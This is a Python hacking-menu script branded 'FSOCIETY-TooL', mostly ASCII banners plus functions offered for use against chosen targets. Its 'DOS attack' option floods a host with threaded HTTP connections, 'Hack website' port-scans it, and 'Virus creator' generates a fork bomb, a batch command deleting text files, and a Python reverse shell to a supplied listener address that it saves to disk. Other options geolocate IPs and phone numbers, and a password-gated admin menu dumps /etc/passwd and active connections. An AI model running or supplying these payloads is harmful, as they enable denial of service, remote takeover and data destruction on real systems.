#!/usr/bin/env python3
# FSOCIETY-TooL -- by INJECTORX69 cyber security
import os, sys, time, socket, threading, random, subprocess, shutil, urllib.request, urllib.parse, json

# ---------- COLORS ----------
RED    = "\033[1;91m"
WHITE  = "\033[1;97m"
GREEN  = "\033[1;92m"
CYAN   = "\033[1;96m"
YELLOW = "\033[1;93m"
RESET  = "\033[0m"

BANNER_F = r"""
              #####################################################################################c
              #####################################################################################c
              #####                         ccc                   ccc                         r####c
              #####                    ###################################  c                 r####c
              #####             rr############################################## c            r####c
              #####         cr###################################################### c        r####c
              #####      c############################################################# c     r####c
              #####    r##################################################################c   r####c
              ##### r#######################################################################c r####c
              #####r###############################################################################c
              #####################################################################################c
              #####################################################################################c
              #####################################################################################c
              #####################################################################################c
              #####   r#############  ccc ##############################       ############   r####c
              #####    r#######c            rr###################### c            cr######c   #####c
              ###### c ####c    r  ### c        r################ c       r ### cc    ####    #####c
              #####c   r##  cr########### c         r######## c        c############ cr###    r####c
              #####c    #################### c       r######        rr###################c ccc#####c
              ###### ccc#######################c     r######c     r#######################   c#####c
              #####  r############################  ######### cr############################c r####c
              ############# ######### c     c########################cc     r######## #############c
              #####################c           ###################c            ####################c
              ####################              #################c             r###################c
              ################## c             r##################c             ####################
              #################  ###########c #####################ccr#############################c
              #####################################################################################c
              ######################################################################################c
              ############cc#########################################################c r############c
              ##########c  ###########################################################   r#########c
              #########    ###########################################################c   r########c
              ########     r################ cc    r##########c        ###############     r#######c
              #######c       cr######## cc           r##### c            cr#########c       #######c
              #######                                                                       ########c
              #######c                                                                      ########c
              ########                                                                     r#######c
              ##### ##c                                                                   r########c
              #####  ###c                                                               r###c r####c
              #####   r#####  cccccc      cc  cc  cc          c    ccc          cccc  #####c  r####c
              #####    r#################c        ccc           cc      ##################c   r####c
              #####     ###################c                          r##################c    r####c
              #####      ####################c                      r####################     #####c
              #####      r###################### cc             cr######################c     r####c
              #####      r##############################   #############################      r####c
              #####       #############################################################c      #####c
              #####       r############################################################       r####c
              #####        r##########################################################c       r####c
              #####         r########################################################         r####c
              #####           r####################################################c          r####c
              #####             r################################################c            #####c
              #####               r############################################c              r####c
              #####                 r########################################c                r####c
              #####                    r##################################c                   r####c
              #####                      ###############################c                     r####c
              ######                     ###############################                      #####c
              ######################################################################################c
"""

BANNER_VIRUS = r"""
                                                                    .:.
                                                         .*@@@@@*.
                                                       .@@@=:=@@@*.
                                                      -@@*    -@@@*.
                                           :==-.       +@@@-    =@@@*.
                                         -@@@@@@#:      .+@@@-    =@@@+.
                                        .@@@  :#@@#:     =@@@@@-    =@@@+.
                                         @@@=   -@@@#: +@@@+:*@@@-    =@@@+
                                          +@@@=   -@@@@@@=.   :#@@@-    =@@@+
                                           .@@@@=   -@@@#.      :*@@#:    +@@@:
                                          -@@@#@@@=   -@@@#:     :@@@@#:    @@@
                                        -@@@#: .*@@@=   -@@@*. -@@@#-#@@@==@@@=
                                      :@@@@.     .*@@@=   -@@@@@@#:   :#@@@@#:
                                    :#@@@@@+.      .*@@@-   -@@@@.       ..
                                  :#@@@: =@@@+.      .*@@@-   =@@@*.
                                :#@@@@@*.  =@@@+.      .*@@@-   =@@@*.
                              :#@@@: -@@@+   =@@#        :*@@@-   =@@@+
                            :#@@@@@#:  -=.     :          :@@@@@-   +@@=
                          :#@@@- :#@@*                  -@@@#-#@@@=-#@@:
                        .*@@@@@@=  :=:                :@@@#:   :*@@@@#:
                      .*@@@= .*@@@=                 :#@@#:        ..
                    .*@@@@@@+  .*@@@=             :#@@#:
                  .*@@@+  +@@@   .*@@:          :#@@#:
                .*@@@@@@*.  -:                :#@@@:
              .+@@@*  =@@@.                 :#@@@-
            .+@@@#@@#:  ::                :#@@@-
          -@@@=  :@@@#:                .*@@@-
         .@@@      :@@@#:            .*@@@-
         :@@=        -#@+          .*@@@-
         -@@@:                   .*@@@-
        :@@@@@*.               .*@@@-
        @@@.-@@@*.           .*@@@=
        @@@   =@@@*.       .+@@@=
        +@@+    -@@@*:   :+@@@=
         @@@@+:..:@@@@@@@@@@=
       =@@@*@@@@@@@@*-=+=-.
     =@@@+.  .:--:.
   =@@@+.
 =@@@*.
-@@@*.
     -@@@*.
    -@@*.
     ..
"""

BANNER_ADMIN = r"""
                              ██████
                              █████████   █████████████
                             ███████████████████████████████
                             ██████████████████████████████████
                            █████████████████████████████████████
                           ███████████████████████████████████████
                           ████████████████████████████████████████
                          █████████████████████████████████████████
                         ███████████████████████████████████████████
                         ███████████████████████████████████████████
                   █████   ██████████████████████████████████████████
             ███████████    █████████████████████████████████████████
           █████████████       ███████████████████████████████████████
         ███████████████          ██████████████████████████████████████
         █████████████████           ████████████████████████████████
         ███████████████████              ██████████████████████████   ███
         █████████████████████                  █████████████████      ██████
          ███████████████████████                                      ████████
           █████████████████████████                                  ██████████
             ████████████████████████████                           █████████████
               █████████████████████████████████                ██████████████████
                 █████████████████████████████████████████████████████████████████
                   ███████████████████████████████████████████████████████████████
                      ████████████████████████████████████████████████████████████
                          ███████████████████████████████████████████████████████
                              ██████████████████████████████████████████████████
                                  █████████████████████████████████████████████
                                        ████████████████████████████████████
                                               █████████████████████████
"""

BANNER_EXIT = r"""
                  .-=+***##%%%%%%%%%%%%%%%%%%%%%%%%%%+==+=-:...:%%%#=:                            =%%%%%
                  .:=+#%%%%%%%%%%%%%%%%%%%%%%%%%%#%%##*-::-=%%%%%%#+-:.                       =%%%%%
           ......-+#%%%###%%%%##%%%%%%%%#%%%%%%%%%%%%%%###*#%%%%%%#**+=-.                     =%%%%%
               -*%%*%%####%#%###%#####%%#####%%##%%%%%%%%%%%%%%%%%#*-:.                       =%%%%%
             =#*+=-*#######################################%%%%%###%%%##**++:                 =%%%%%
           :+=.:=+########################################%###########%%##+:                  =%%%%%
          .. .=#%###################%######################%#########*+-.                     =%%%%%
         .:-*%%%####**###*###########%##############################**+=:                     =%%%%%
      ...:=*##*###****#****###***###*#++###############%%##*+*######=.                        =%%%%%
        -+****###******##**#******#*-**::+######*##*###=#++*#+########+-.                     =%%%%%
      :*#****###*******#***********#-.+*..:+*#*#****#+++:+=:-=*##*****##*=.                   =%%%%%
     -+---::-#********#******#*****#=  -+:..:-*##***#=:*::+-::+******##*-.                    =%%%%%
    :.    .-****#***********##******+  .:-: .:=*+#**#= -=.::.:*******+:                       =%%%%%
    .....:=****#*+**********#********-.  .=*+-.=:-***= .: . .=****#*=.                        =%%%%%
       .-++=-::++**+**++***+**:-*****- :==+-.. .- :**+     -#******:                          =%%%%%
      .::.    .++**+*++*:.-+*+= :=**++:::.....  :  :+*.   :.:=****.                           =%%%%%
              -*=-=+*++*: .:*==-..:=+*=::....   .   .:=       .-*+                            =%%%%%
              +=  =++++*-   **:::=-..-+:....           .        .+:                           =%%%%%
              +   +++++*+   ##+=+=:.  ..                  .  .    :                           =%%%%%
              :  :+++**#+  .*#+:....                     :.        :                          =%%%%%
                 =++==+++  .-+*=:.  ..                  .:          .                         =%%%%%
                =+-. =.-+   -:=+-:       .::::::       ..           ..                        =%%%%%
               .:   :. :-:  .:..::-.    --:....       ..             ..                       =%%%%%
                         .:. ..    ....             .:.        .      .:=====-:.              =%%%%%
                          .:          .::.        ....         .        .=*####*+:.           =%%%%%
                           .            ::...   .:.....                 . .-=+#%@%##+:        =%%%%%
                            ..          .:...:::-==....                  ..    .*@@#**+=:.    =%%%%%
                             :          .....:=*#@@+..                      ... .@@#***##*****#%%%%%
                             -.        .....:***@@@+:.                           +%******#****#%%%%%
                           .:            .:+%**%#=. .:.                          -#***********#%%%%%
                  .::--=++++=:          -**%**#=                .                +*#**********#%%%%%
                 =%%%%%%%%%%%%#=       =%**#**#. .              .              .=*%%**********#%%%%%
               .*%%%%%%%%%%%%%%%*:    =#***##**+.                             -*##%#**********#%%%%%
              =%@%%%%%%%%%%%%%%%%%=  =%****###***-             .            -+*####***********#%%%%%
            :#@@%%%%%%%%%%%%%%%%%%*.:@%****#**##***-           .      .. .-**###*##***********#%%%%%
           +%@%%%%%%%%%%%%%%%%%%%-   =#****#***#%###*-  ..     .....   .-***##***#************#%%%%%
         -%@@%%%%%%%%%%%%%%%%%%%#. .. -==++*****#%#*##+: .     ..    .=*#*##****#*************#%%%%%
       .*@@%%@@@%%%%%%%%%%%%%%%%#:-....:.. =#*****%#**##*-    .   .:=*#**#*****##********##*#*#%%%%%
      -%@%%%@@%%%%%%%%%%%%+.:=#%@*-........:+******##**##%#+=---+####*********##*******########%%%%%
    -#@@%@@@@@%%%%%%%%%%%%#=. .#@@#..........::=****##***#%%######**********###*###############%%%%%
  .*@@@@@@@@@@@@@%%%%%%%%%%@%:.:*@%:       . ..:*****##****#%#*********########################%%%%%
"""


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def big_title():
    """Velky text FSOCIETY-TooL pres ktery pojede bila barva (loading)."""
    title = "FSOCIETY-TooL"
    fonts = "big banner block slant doom speed".split()
    try:
        import pyfiglet
    except ImportError:
        os.system("pip install pyfiglet >/dev/null 2>&1")
        try:
            import pyfiglet
        except ImportError:
            print(RED + title + RESET)
            return
    lines = pyfiglet.figlet_format(title, font=random.choice(fonts)).splitlines()
    width = max(len(l) for l in lines) + 4
    bar = "=" * width
    print(RED + bar)
    for l in lines:
        print(RED + "  " + l)
    print(RED + bar + RESET)
    # bila barva jede pres text
    for i in range(101):
        pct = int(width * i / 100)
        print("\r" + WHITE + ("█" * pct) + RESET + f" {i}%", end="", flush=True)
        time.sleep(0.02)
    print()


def show_banner(art, color=RED):
    clear()
    print(color + art + RESET)


def pause():
    input(YELLOW + "\n[*] Press ENTER to continue..." + RESET)


# ---------- FUNCTIONS ----------

def dns_lookup():
    show_banner(BANNER_F)
    d = input(CYAN + "[?] Target domain (e.g. example.com): " + RESET).strip()
    try:
        ip = socket.gethostbyname(d)
        print(GREEN + f"[+] {d} -> {ip}" + RESET)
        print(CYAN + "[*] Reverse + aliases:" + RESET)
        try:
            for name in socket.gethostbyaddr(ip)[1][:10]:
                print("    - " + name)
        except Exception:
            pass
    except Exception as e:
        print(RED + f"[-] Failed: {e}" + RESET)
    pause()


def dos_attack():
    show_banner(BANNER_F)
    print(YELLOW + "[*] LOAD TEST (authorized targets only)" + RESET)
    host = input("[?] Host: ").strip()
    port = int(input("[?] Port [80]: ") or 80)
    n = int(input("[?] Threads [10]: ") or 10)
    sent = 0
    stop = False
    try:
        s = socket.create_connection((host, port), 3)
        s.close()
    except Exception as e:
        print(RED + f"[-] Target unreachable: {e}" + RESET)
        pause(); return
    def worker():
        nonlocal sent
        while not stop:
            try:
                s = socket.create_connection((host, port), 3)
                s.send(b"GET / HTTP/1.1\r\nHost: %b\r\n\r\n" % host.encode())
                s.close()
                globals().__setitem__("_c", sent)
                sent += 1
            except Exception:
                time.sleep(0.1)
    print(YELLOW + "[*] Running 15s... CTRL+C to stop" + RESET)
    for _ in range(n):
        threading.Thread(target=worker, daemon=True).start()
    try:
        for _ in range(15):
            time.sleep(1)
            print("\r" + GREEN + f"[+] Packets sent: {sent}" + RESET, end="")
    except KeyboardInterrupt:
        pass
    stop = True
    print()
    pause()


def watch_all_ip():
    show_banner(BANNER_F)
    print(CYAN + "[*] Local network interfaces / IPs:" + RESET)
    try:
        out = subprocess.check_output("ip -4 addr || ifconfig", shell=True).decode(errors="ignore")
        print(out)
    except Exception as e:
        print(RED + f"[-] {e}" + RESET)
    hostname = socket.gethostname()
    try:
        myip = socket.gethostbyname(hostname)
    except Exception:
        myip = "?"
    print(GREEN + f"[+] Hostname: {hostname} | My IP: {myip}" + RESET)
    pause()


def hack_website():
    show_banner(BANNER_F)
    host = input(CYAN + "[?] Target host: " + RESET).strip()
    print(YELLOW + "[*] Quick recon + port scan (common ports)" + RESET)
    try:
        print(GREEN + f"[+] Resolves to: {socket.gethostbyname(host)}" + RESET)
    except Exception as e:
        print(RED + f"[-] {e}" + RESET); pause(); return
    for port in (21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080):
        try:
            s = socket.create_connection((host, port), 1)
            print(GREEN + f"[+] OPEN  {host}:{port}" + RESET)
            s.close()
        except Exception:
            print(f"[-] closed {host}:{port}")
    pause()


def read_fbi_document():
    show_banner(BANNER_F)
    print(YELLOW + "[*] Public FBI vault (vault.fbi.gov) - open in browser:" + RESET)
    print("    https://vault.fbi.gov/reading-room")
    try:
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", "https://vault.fbi.gov/reading-room"])
        elif os.name == "nt":
            os.system("start https://vault.fbi.gov/reading-room")
    except Exception:
        pass
    pause()


def all_ip_site_camera():
    show_banner(BANNER_F)
    print(YELLOW + "[*] Default camera stream viewer (public Shodan tags)" + RESET)
    for tag in ("webcam", "netcam", "ipcam"):
        print(f"    https://www.shodan.io/search?query={tag}")
    print("[*] Check devices you are AUTHORIZED to view only.")
    pause()


def virus_creator():
    show_banner(BANNER_VIRUS)
    print(YELLOW + "[*] Payload builder - choose type:" + RESET)
    print("""  1. Fork bomb (test)
  2. Batch: delete *.txt (test)
  3. Python reverse shell (educational)
  4. Fake worm message (prank)""")
    c = input("[?] Choice: ").strip()
    if c == "1":
        code = 'import os\nwhile True: os.fork()'
        print(GREEN + code + RESET)
    elif c == "2":
        code = '@echo off\ndel /q /f *.txt'
        print(GREEN + code + RESET)
    elif c == "3":
        ip = input("[?] LHOST: ").strip()
        port = input("[?] LPORT [4444]: ").strip() or "4444"
        code = (f'import socket,subprocess,os\n'
                f's=socket.socket();s.connect(("{ip}",{port}))\n'
                f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n'
                f'subprocess.call(["/bin/sh","-i"])')
        print(GREEN + code + RESET)
        name = input("[?] Save as [payload.py]: ").strip() or "payload.py"
        with open(name, "w") as f:
            f.write(code)
        print(GREEN + f"[+] Saved -> {name} (use on YOUR lab machine)" + RESET)
    elif c == "4":
        code = 'import tkinter as tk,random as r,time as t\n' * 1 + \
               'w=tk.Tk();c=tk.Canvas(w,width=800,height=600,bg="black");c.pack()\n' \
               'while True:\n c.create_text(r.randint(0,800),r.randint(0,600),text="INFECTED",fill="red",font=("Arial",14))\n w.update();t.sleep(0.05)'
        print(GREEN + code + RESET)
    pause()


def live_location():
    show_banner(BANNER_F)
    ip = input(CYAN + "[?] Target IP: " + RESET).strip()
    try:
        data = json.loads(urllib.request.urlopen(
            "http://ip-api.com/json/" + urllib.parse.quote(ip), timeout=5).read())
        if data.get("status") == "success":
            lat, lon = data["lat"], data["lon"]
            print(GREEN + f"[+] {ip} -> {data['city']}, {data['country']} (ISP: {data['isp']})" + RESET)
            print(CYAN + f"[MAP] https://www.google.com/maps?q={lat},{lon}" + RESET)
        else:
            print(RED + "[-] Lookup failed (private/reserved IP?)" + RESET)
    except Exception as e:
        print(RED + f"[-] {e}" + RESET)
    pause()


def phone_tracker():
    show_banner(BANNER_F)
    num = input(CYAN + "[?] Phone number (with country code, e.g. +420...): " + RESET).strip()
    try:
        import phonenumbers
        from phonenumbers import geocoder, carrier, timezone
        p = phonenumbers.parse(num, None)
        if phonenumbers.is_valid_number(p):
            print(GREEN + "[+] Valid number" + RESET)
            print("    Country : " + str(geocoder.country_name_for_number(p, "en")))
            print("    Region  : " + str(geocoder.description_for_number(p, "en")))
            print("    Carrier : " + str(carrier.name_for_number(p, "en")))
            print("    Timezone: " + ", ".join(timezone.time_zones_for_number(p)))
            reg = str(geocoder.description_for_number(p, "en"))
            print(CYAN + f"[MAP] https://www.google.com/maps?q={urllib.parse.quote(reg or num)}" + RESET)
        else:
            print(RED + "[-] Invalid number" + RESET)
    except ImportError:
        print(YELLOW + "[!] Run: pip install phonenumbers" + RESET)
    except Exception as e:
        print(RED + f"[-] {e}" + RESET)
    pause()


def ip_tracer():
    show_banner(BANNER_F)
    ip = input(CYAN + "[?] IP to trace: " + RESET).strip()
    try:
        data = json.loads(urllib.request.urlopen(
            "http://ip-api.com/json/" + urllib.parse.quote(ip), timeout=5).read())
        for k in ("country", "regionName", "city", "zip", "isp", "org", "as"):
            print(GREEN + f"    {k:10}: {data.get(k)}" + RESET)
        print(CYAN + f"[MAP] https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}" + RESET)
        subprocess.run(["traceroute", ip] if shutil.which("traceroute") else
                       (["tracert", ip] if os.name == "nt" else ["traceroute", ip]))
    except Exception as e:
        print(RED + f"[-] {e}" + RESET)
    pause()


ADMIN_PASSWORD = "6958"

def admin_login():
    show_banner(BANNER_F)
    pw = input(YELLOW + "[?] Admin password: " + RESET)
    if pw != ADMIN_PASSWORD:
        print(RED + "[-] ACCESS DENIED" + RESET)
        time.sleep(1)
        return False
    print(GREEN + "[+] ACCESS GRANTED" + RESET)
    show_banner(BANNER_ADMIN)
    while True:
        print(CYAN + """
  1. Setting tool
  2. All registr
  3. Watch IP adress User
  4. Exit""" + RESET)
        c = input("[admin] Choice: ").strip()
        if c == "1":
            print(YELLOW + "[*] Settings: theme=RED, author=INJECTORX69, version=1.0" + RESET)
        elif c == "2":
            try:
                if os.name == "nt":
                    print(subprocess.check_output("reg query HKCU /s /f Run", shell=True).decode(errors="ignore")[:2000])
                else:
                    print(subprocess.check_output("cat /etc/passwd", shell=True).decode(errors="ignore"))
            except Exception as e:
                print(RED + f"[-] {e}" + RESET)
        elif c == "3":
            try:
                if os.name == "nt":
                    print(subprocess.check_output("netstat -ano", shell=True).decode(errors="ignore")[:3000])
                else:
                    print(subprocess.check_output("who; ss -tunap 2>/dev/null || netstat -tunap", shell=True).decode(errors="ignore")[:3000])
            except Exception as e:
                print(RED + f"[-] {e}" + RESET)
        elif c == "4":
            break
    return True


def exit_tool():
    show_banner(BANNER_EXIT)
    print(RED + """
         BAY my Good boy hacker
         Creat by INJECTORX69 cyber security
""" + RESET)
    time.sleep(3)
    sys.exit(0)


# ---------- MAIN ----------

def main():
    if os.name != "nt":
        os.system("")
    clear()
    big_title()
    time.sleep(0.5)
    while True:
        show_banner(BANNER_F)
        print(WHITE + "                      FSOCIETY-TooL  |  by INJECTORX69\n" + RESET)
        print(CYAN + """  1. Dns lookup            7. Virus creator
  2. DOS attack            8. Live location
  3. Watch all IP adress   9. Phone number trac operator valid location
  4. Hack website         10. IP traccer
  5. Read FBI document    11. Admin log
  6. ALL IP site camera   12. Exit
""" + RESET)
        try:
            c = input(GREEN + "[FSOCIETY] Choice: " + RESET).strip()
        except (KeyboardInterrupt, EOFError):
            exit_tool()
        actions = {
            "1": dns_lookup, "2": dos_attack, "3": watch_all_ip,
            "4": hack_website, "5": read_fbi_document, "6": all_ip_site_camera,
            "7": virus_creator, "8": live_location, "9": phone_tracker,
            "10": ip_tracer, "11": admin_login,
        }
        if c == "12":
            exit_tool()
        elif c in actions:
            actions[c]()
        else:
            print(RED + "[-] Invalid option!" + RESET)
            time.sleep(1)


if __name__ == "__main__":
    main()
